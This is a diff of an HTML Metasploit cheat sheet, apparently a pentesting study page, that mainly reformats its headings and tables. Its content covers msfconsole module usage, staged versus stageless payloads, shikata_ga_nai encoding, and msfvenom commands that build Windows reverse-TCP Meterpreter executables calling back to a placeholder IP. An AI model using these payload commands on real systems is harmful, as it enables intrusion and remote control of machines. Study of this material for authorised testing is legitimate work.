@@ -63,25 +63,45 @@
     <div class="container">
       <section id="main_content">
         <p>targeturi = blog</p>
-<h1 id="archi">Archi</h1>
-<p>/usr/share/metasploit-framework</p>
+<h1 id="architecture">Architecture</h1>
+<p><code class="language-plaintext highlighter-rouge">/usr/share/metasploit-framework </code></p>
 
 <h1 id="metasploit">Metasploit</h1>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole <span class="nt">-q</span>
 </code></pre></div></div>
 
 <h2 id="modules">Modules</h2>
-<p>Type	Description
-Auxiliary	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
-Exploits	Defined as modules that exploit a vulnerability that will allow for the payload delivery.
-Post	Wide array of modules to gather information, pivot deeper, etc.</p>
+<p>Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Type</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Auxiliary</td>
+      <td>Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.</td>
+    </tr>
+    <tr>
+      <td>Exploits</td>
+      <td>Defined as modules that exploit a vulnerability that will allow for the payload delivery.</td>
+    </tr>
+    <tr>
+      <td>Post</td>
+      <td>Wide array of modules to gather information, pivot deeper, etc.</td>
+    </tr>
+  </tbody>
+</table>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Search Module </span>
 msf6 <span class="o">&gt;</span> search &lt;KEYWORD&gt;
 
-<span class="c"># Use Module</span>
+<span class="c"># Select Module</span>
 msf6 <span class="o">&gt;</span> use &lt;PATH&gt;
-msf6 <span class="o">&gt;</span> use 0
+msf6 <span class="o">&gt;</span> use &lt;NUMBER&gt;
 
 <span class="c"># Show Module Info</span>
 msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;Module&gt;<span class="o">)</span> <span class="o">&gt;</span> info
@@ -90,16 +110,18 @@ msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;Module&gt;<span class="o">)</span> 
 msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> show options
 
 <span class="c"># Define option to exploit</span>
-msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> SET &lt;OPTIONS&gt; &lt;VALUE&gt;
+msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set</span> &lt;OPTIONS&gt; &lt;VALUE&gt;
 
 <span class="c"># Run the exploit</span>
-msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> run
+msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> run/exploit
 
 <span class="c"># Run as a job</span>
 msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> run <span class="nt">-j</span> 
 </code></pre></div></div>
 
-<h2 id="target">Target</h2>
+<h2 id="targets">Targets</h2>
+<p>Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.</p>
+
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> show targets
 </code></pre></div></div>
 
@@ -108,11 +130,14 @@ msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> 
 
 <p>For example, windows/shell_bind_tcp is a single payload with no stage, whereas windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell).</p>
 
-<p>Start with staged payloads 
-Use non-staged payloads if staged payloads fail.</p>
+<ul>
+  <li>Start with staged payloads</li>
+  <li>Use non-staged payloads if staged payloads fail.</li>
+</ul>
+
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> show payloads
 
-msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload &lt;NUM&gt;
+msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload &lt;NUMBER&gt;
 </code></pre></div></div>
 
 <h2 id="enconders">Enconders</h2>
@@ -214,11 +239,7 @@ OPTIONS:
 </code></pre></div></div>
 
 <h2 id="encoder">Encoder</h2>
-<h3 id="generating-payload---without-encoding">Generating Payload - Without Encoding</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-p</span> windows/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> perl
-</code></pre></div></div>
-
-<h3 id="generating-payload---with-encoding">Generating Payload - With Encoding</h3>
+<h3 id="generating-payload-with-encoding">Generating Payload With Encoding</h3>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-p</span> windows/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> perl <span class="nt">-e</span> x86/shikata_ga_nai
 </code></pre></div></div>
 
@@ -247,7 +268,7 @@ OPTIONS:
 <h2 id="meterpreter-shells">Meterpreter Shells</h2>
 <p>windows/meterpreter_reverse_https is actually a much more powerful choice because of the encrypted channel, and it allows you to disconnect the payload (and exit msfconsole) without terminating it. And then the payload will automatically get back to you as soon as you set up the handler again.</p>
 
-<h3 id="payloads-2">Payloads</h3>
+<h3 id="msfvenom-payloads">MSFvenom Payloads</h3>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Staged Payloads for Windows</span>
 <span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x64.exe
 <span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x86.exe
